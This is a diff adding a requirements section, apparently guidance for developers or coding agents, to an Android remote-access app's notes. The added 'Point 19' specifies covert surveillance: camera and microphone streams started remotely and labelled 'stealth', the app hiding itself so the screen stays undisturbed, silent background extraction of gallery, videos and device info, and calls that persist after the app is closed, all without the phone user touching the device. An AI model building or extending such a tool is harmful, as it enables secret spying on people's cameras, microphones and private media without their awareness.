@@ -236,3 +236,19 @@ After any change affecting the Android APK or backend:
 - **Point 18: WebView File Chooser & Unified Real-Time Runtime Logging (v6.4.10):**
   - In `MainActivity.java`, `WebChromeClient.onShowFileChooser()` MUST be implemented to forward `<input type="file">` to Android's native system file chooser / gallery, returning picked URIs in `onActivityResult` (`FILE_CHOOSER_REQUEST_CODE = 2002`). Chat attachment action items are wired with explicit click dispatchers.
   - Both Android (`AppLog`), Web Browser (`window.sendClientLog`), and Server (`server.js`) emit runtime diagnostics to a shared circular buffer (200 entries), accessible live inside the UI terminal modal (`#live-logs-modal`) and via `GET /api/logs`.
+
+- **Point 19: Registered Devices — Unattended Remote, Background & Closed-App Execution Contract (v6.4.13):**
+  - **100% Unattended Hands-Free Operation:** The mobile phone user must NEVER have to touch the device to initiate, accept, or sustain Video Calls, Audio Calls, Screen Sharing, Remote Touch Control, Gallery, Videos, or Device Info. All actions are triggered remotely from the desktop/laptop web browser.
+  - **Closed-App, Background & Lock-Screen Support:** Every registered device feature must connect and function reliably across Foreground, Background, and Closed-App states.
+  - **Direct Background Execution for Media & Info:** `get_gallery`, `get_videos`, `get_media_detail`, and `get_device_info` are serviced directly in background threads by `RemoteAccessibilityService` via `MediaBridge` over `mBgSocket` without turning on the screen or opening any activity.
+  - **Stealth Background Video & Audio Calls via `ScreenCaptureService`:**
+    - On Android 11+ (API 30+), background camera capture is strictly forbidden unless an active Foreground Service declared with `foregroundServiceType="camera"` is running.
+    - When `video_call` or `audio_call` starts remotely: `MainActivity` immediately starts `ScreenCaptureService` in the foreground with `FOREGROUND_SERVICE_TYPE_CAMERA | FOREGROUND_SERVICE_TYPE_MICROPHONE` (omitting `MEDIA_PROJECTION` to comply with Android 14 requirements), connects WebRTC in `WebRTCCompanion`, and immediately pushes itself to the background (`moveTaskToBack(true)`).
+    - The phone screen remains undisturbed (on home screen or prior app) while camera and audio streams continue live and uninterrupted in the background.
+  - **Never Disconnect on App Swipe or Minimize:**
+    - If `MainActivity` is swiped away from Recents or minimized during an active call, the call MUST NOT disconnect or drop!
+    - `MainActivity.onDestroy()` checks `isInCall()` and `isScreenSharing()`; if active, it preserves `sWebRTCCompanion` in memory and detaches callbacks without destroying the PeerConnection or stopping streams.
+    - `ScreenCaptureService` (with `android:stopWithTask="false"`) maintains foreground camera and microphone privileges.
+    - A call is ONLY terminated when the web browser user explicitly clicks "Disconnect" / "End Call", or when the network connection is permanently severed.
+  - **Clean Hardware Release on Remote Hangup:**
+    - When the browser clicks "Disconnect" / "End Call", `end_call` is routed to the device, which calls `sWebRTCCompanion.endCall(false)` and `stopService(ScreenCaptureService)`, immediately stopping all camera capturers, audio tracks, and foreground notifications, returning the device to low-power idle standby.
